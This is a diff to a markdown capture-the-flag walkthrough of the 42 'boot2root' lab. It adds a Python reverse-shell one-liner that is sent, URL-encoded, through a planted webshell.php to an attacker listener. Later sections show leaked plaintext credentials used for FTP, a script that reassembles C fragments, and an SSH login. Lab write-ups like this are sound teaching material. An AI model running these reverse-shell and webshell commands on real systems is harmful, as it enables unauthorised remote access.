@@ -236,7 +236,13 @@ xel@lucky7 ~/files/42/boot2root % nc -lvnp 4444
 Listening on 0.0.0.0 4444
 ```
 
-To establish a reverse shell on the target, we take a Python reverse shell script from the **[Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python)**. We encode the payload using **CyberChef** with URL encoding, resulting in the following command:
+To establish a reverse shell on the target, we take a Python reverse shell script from the **[Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python)**. 
+
+```python
+export RHOST="192.168.0.24";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+
+We encode the payload using **CyberChef** with URL encoding, resulting in the following command:
 
 ```bash
 xel@lucky7 ~/files/42/boot2root % curl --insecure 'https://192.168.0.31/forum/templates_c/webshell.php?cmd=export%20RHOST%3D%22192%2E168%2E0%2E24%22%3Bexport%20RPORT%3D4444%3Bpython%20%2Dc%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28%29%3Bs%2Econnect%28%28os%2Egetenv%28%22RHOST%22%29%2Cint%28os%2Egetenv%28%22RPORT%22%29%29%29%29%3B%5Bos%2Edup2%28s%2Efileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty%2Espawn%28%22%2Fbin%2Fsh%22%29%27'
@@ -254,3 +260,135 @@ $
 ```
 
 We now have a reverse shell running as the **www-data** user, giving us command execution on the target system.
+
+## 7. Exploring the Target
+
+While exploring the `/home` directory, we notice a folder named **LOOKATME** owned by the **www-data** user. Inside this directory, we find a file named `password`.
+
+```bash
+$ cat password
+lmezard:G!@M6f4Eatau{sF"
+G!@M6f4Eatau{sF"
+```
+
+We attempt to use these credentials to connect via **SSH**, but they don’t work. However, when we try logging into **FTP**, it works!
+
+### FTP Access
+
+```bash
+xel@lucky7 ~/files/42/boot2root % ftp 192.168.0.31 
+
+Connected to 192.168.0.31.
+220 Welcome on this server
+Name (192.168.0.31:xel): lmezard
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||10673|).
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxrwxrwx    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+ftp> get fun
+local: fun remote: fun
+229 Entering Extended Passive Mode (|||23492|).
+150 Opening BINARY mode data connection for fun (808960 bytes).
+100% |*************************************************************************************************|   790 KiB   14.80 MiB/s    00:00 ETA
+226 Transfer complete.
+ftp> get README
+local: README remote: README
+229 Entering Extended Passive Mode (|||19402|).
+150 Opening BINARY mode data connection for README (96 bytes).
+100% |*************************************************************************************************|    96      801.28 KiB/s    00:00 ETA
+226 Transfer complete.
+```
+
+The **README** file contains a challenge that must be completed to unlock further access:
+
+```bash
+xel@lucky7 ~/files/42/boot2root % CAT README
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+```
+
+We also download a file named **fun** from the FTP server. Let’s investigate this file further:
+
+```bash
+xel@lucky7 ~/files/42/boot2root % file fun 
+fun: POSIX tar archive (GNU)
+```
+
+The file is a tar archive, so we extract it:
+
+```bash
+xel@lucky7 ~/files/42/boot2root % tar -xvf fun
+```
+
+The extraction creates a directory named **ft_fun**, containing 750 files.
+Each of the 750 files follows a similar structure:
+
+```bash
+xel@lucky7 ~/files/42/boot2root/ft_fun % cat 0564G.pcap 
+}void useless() {
+
+//file355%
+```
+
+It becomes apparent that each file contains a small fragment of C code, and they all have comments indicating their position (e.g., `//file355%`). Our task is to reconstruct the full C program by piecing together the fragments in the correct order based on these comments.
+
+## 8. Rebuilding the Code
+
+We will now proceed with writing a Python script to automate the extraction and ordering of the code snippets to solve this challenge. 
+
+Here’s the Python script to automate this process:
+
+```python
+import os
+import re
+
+directory = "./ft_fun/"
+fragments = {}
+pattern = re.compile(r'//file(\d+)')
+
+for filename in os.listdir(directory):
+    filepath = os.path.join(directory, filename)
+    
+    with open(filepath, 'r') as file:
+        content = file.read()
+        match = pattern.search(content)
+        if match:
+            file_number = int(match.group(1))
+            fragments[file_number] = content.strip()
+
+ordered_fragments = dict(sorted(fragments.items()))
+
+with open("main.c", "w") as output_file:
+    for _, fragment in ordered_fragments.items():
+        output_file.write(fragment + "\n")
+```
+
+### Compiling and Running the Code
+
+Once the C code is reconstructed, we can compile and run it to retrieve the final password.
+
+```bash
+xel@lucky7 ~/files/42/boot2root/ % gcc main.c
+xel@lucky7 ~/files/42/boot2root/ft_fun % ./main.c
+
+MY PASSWORD IS: Iheartpwnage
+Now SHA-256 it and submit
+```
+
+To complete the challenge, we are asked to hash the password using the **SHA-256** algorithm. We can do this using the following command:
+
+```bash
+xel@lucky7 ~/files/42/boot2root/ % echo -n "Iheartpwnage" | sha256sum
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+xel@lucky7 ~/files/42/boot2root/ % ssh laurie@192.168.0.31
+laurie@192.168.0.31's password:
+
+laurie@BornToSecHackMe:~$
+```
